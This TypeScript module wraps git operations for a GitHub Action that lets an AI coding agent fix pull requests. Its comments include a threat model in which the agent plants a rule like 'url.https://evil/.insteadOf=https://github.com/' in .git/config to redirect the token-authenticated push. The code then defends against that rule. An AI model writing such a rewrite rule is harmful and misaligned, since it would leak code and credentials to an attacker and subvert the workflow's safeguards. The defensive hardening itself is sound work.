import { execFileSync } from "node:child_process";
import { readFileSync } from "node:fs";
import * as core from "@actions/core";

/**
 * `git rev-parse HEAD`. On failure, logs a `core.warning(...)` prefixed with
 * `[label]` and returns `""` so callers can decide whether to bail out.
 *
 * `label` (`"pre-fix"` / `"post-fix"`) preserves the original log prefix the
 * pre-fix and post-fix entrypoints used before this helper was extracted.
 */
export function readHeadSha(label: string): string {
  try {
    return execFileSync("git", ["rev-parse", "HEAD"], {
      encoding: "utf-8",
    }).trim();
  } catch (error) {
    core.warning(
      `[${label}] Could not read HEAD sha: ${
        error instanceof Error ? error.message : String(error)
      }`,
    );
    return "";
  }
}

/**
 * `git checkout <ref>`. A failure here means the workflow cannot operate on
 * the intended PR ref (e.g. force-push / branch-rename race). Propagating
 * the error lets the outer crash-recovery demote `fixing` back to a terminal
 * status; swallowing it would let claude-code-action and post-fix run
 * against whatever ref happens to be checked out, producing commits on the
 * wrong branch or surprise push failures.
 */
export function checkoutBranch(ref: string): void {
  execFileSync("git", ["checkout", ref], { stdio: "inherit" });
}

/** `git diff --numstat --no-renames HEAD` (raw stdout). */
export function gitDiffNumstat(): string {
  return execFileSync("git", ["diff", "--numstat", "--no-renames", "HEAD"], {
    encoding: "utf-8",
  });
}

/** `git ls-files --others --exclude-standard` (raw stdout). */
export function gitListUntracked(): string {
  return execFileSync("git", ["ls-files", "--others", "--exclude-standard"], {
    encoding: "utf-8",
  });
}

/**
 * Read a file from the working tree. Returns `null` when the file is missing
 * or contains a NUL byte (treated as binary; `checkScope` refuses binary
 * entries).
 */
export function readWorkingTreeFile(path: string): string | null {
  try {
    const content = readFileSync(path);
    if (content.includes(0)) return null;
    return content.toString("utf-8");
  } catch {
    return null;
  }
}

/**
 * `git reset --hard HEAD` followed by `git clean -ffd`. The double-force
 * clean removes untracked directories and nested git working trees, so
 * files newly written by claude-code-action do not survive a "rollback" and
 * pollute subsequent iterations of the same job.
 */
export function resetWorkingTree(): void {
  execFileSync("git", ["reset", "--hard", "HEAD"], { stdio: "inherit" });
  execFileSync("git", ["clean", "-ffd"], { stdio: "inherit" });
}

/** `git add -- <paths>`. No-op when `paths` is empty. */
export function stagePaths(paths: string[]): void {
  if (paths.length === 0) return;
  execFileSync("git", ["add", "--", ...paths], { stdio: "inherit" });
}

/**
 * `git diff --cached --quiet`. Returns `true` when there are staged changes
 * (the command exits non-zero), `false` when the index matches HEAD.
 */
export function hasStagedChanges(): boolean {
  try {
    execFileSync("git", ["diff", "--cached", "--quiet"], { stdio: "inherit" });
    return false;
  } catch {
    return true;
  }
}

/** `git commit -m <message>`. */
export function commit(message: string): void {
  execFileSync("git", ["commit", "-m", message], { stdio: "inherit" });
}

/** `git push`. */
export function push(): void {
  execFileSync("git", ["push"], { stdio: "inherit" });
}

/**
 * Strip the `http.https://github.com/.extraheader` entry that
 * `actions/checkout@v5` writes for `GITHUB_TOKEN`. Git's `http.extraHeader`
 * is multi-value, so if we leave that key in place and add our own via
 * `-c http.extraheader=...`, both headers are sent and the server may pick
 * the wrong one — defeating `AUTO_REVIEW_PUSH_TOKEN`.
 *
 * `git config --unset-all <key>` exits 5 when the key is not present (the
 * expected case outside Actions). Any other failure (corrupt config etc.)
 * propagates: silently swallowing those would leave the GITHUB_TOKEN
 * extraheader in place and re-introduce the duplicate-Authorization bug.
 */
function unsetCheckoutExtraheader(): void {
  try {
    execFileSync(
      "git",
      [
        "config",
        "--local",
        "--unset-all",
        "http.https://github.com/.extraheader",
      ],
      { stdio: "inherit" },
    );
  } catch (err) {
    const status = (err as { status?: unknown }).status;
    if (status === 5) {
      // No matching key. Safe to continue.
      return;
    }
    throw err;
  }
}

/**
 * Remove every `url.<base>.insteadOf` / `url.<base>.pushInsteadOf` rewrite
 * rule from local config before pushing (Codex follow-up on PR #77).
 *
 * Threat model: claude-code-action runs before post-fix and could write a
 * rule like `url.https://evil/.insteadOf=https://github.com/` into
 * `.git/config`. Git resolves rewrites *before* using the URL passed to
 * `git push`, so a pinned `destUrl` still gets redirected to the attacker.
 * Passing `-c url.https://github.com/.insteadOf=` only neutralises the
 * specific github.com base key — any other matching `<base>` is untouched.
 *
 * Strategy: enumerate every rewrite key via `git config --get-regexp`, then
 * `--unset-all` each one. `get-regexp` exits 1 when there are no matches
 * (no rewrite rules at all) — that path is benign and returns silently.
 * Individual `--unset-all` exit-5 races are also ignored. Anything else is
 * surfaced so a corrupt local config cannot silently bypass the cleanup.
 */
function clearUrlRewriteRules(): void {
  let listOutput: string;
  try {
    listOutput = execFileSync(
      "git",
      [
        "config",
        "--local",
        "--get-regexp",
        "^url\\..*\\.(insteadOf|pushInsteadOf)$",
      ],
      { encoding: "utf-8" },
    );
  } catch (err) {
    const status = (err as { status?: unknown }).status;
    if (status === 1) {
      // No matching keys → nothing to clear.
      return;
    }
    throw err;
  }

  const keys = new Set<string>();
  for (const line of listOutput.split("\n")) {
    const trimmed = line.trim();
    if (!trimmed) continue;
    // Lines look like:  url.https://github.com/.insteadOf  <value>
    const [key] = trimmed.split(/\s+/, 1);
    if (key) keys.add(key);
  }

  for (const key of keys) {
    try {
      execFileSync(
        "git",
        ["config", "--local", "--unset-all", key],
        { stdio: "inherit" },
      );
    } catch (err) {
      const status = (err as { status?: unknown }).status;
      if (status === 5) {
        // Already gone (e.g., concurrent unset). Treat as success.
        continue;
      }
      throw err;
    }
  }
}

/**
 * Push using a one-shot `http.extraheader` Authorization when `token` is
 * configured (TY-270 #20).
 *
 * GitHub's `GITHUB_TOKEN` pushes do not trigger downstream workflow runs. A
 * dedicated machine-user PAT or GitHub App token can be supplied here so the
 * repair commit creates required checks on protected branches.
 *
 * Defense layers (Codex security follow-up on PR #77):
 *   1. **Pinned destination**: `destUrl` and refspec are constructed from
 *      trusted Config values (`owner`, `repo`, `ref`) and passed to `git
 *      push` explicitly. `remote.origin.url` is intentionally NOT used —
 *      claude-code-action runs before post-fix and could mutate `.git/config`.
 *   2. **Cleared rewrite rules** (`clearUrlRewriteRules`): every existing
 *      `url.<base>.insteadOf` / `pushInsteadOf` entry is unset before push,
 *      so a tampered `.git/config` cannot redirect `destUrl` via rewrites.
 *   3. **Stripped checkout extraheader** (`unsetCheckoutExtraheader`): the
 *      per-host `http.https://github.com/.extraheader` left by
 *      `actions/checkout@v5` is removed before we add our own via `-c`, so
 *      duplicate `Authorization` headers do not race against each other.
 */
export function pushWithToken(
  owner: string,
  repo: string,
  ref: string,
  token: string,
): void {
  if (token === "") {
    push();
    return;
  }

  unsetCheckoutExtraheader();
  clearUrlRewriteRules();

  const destUrl = `https://github.com/${owner}/${repo}.git`;
  const basic = Buffer.from(`x-access-token:${token}`).toString("base64");
  execFileSync(
    "git",
    [
      "-c",
      `http.extraheader=AUTHORIZATION: Basic ${basic}`,
      "push",
      destUrl,
      `HEAD:refs/heads/${ref}`,
    ],
    { stdio: "inherit" },
  );
}
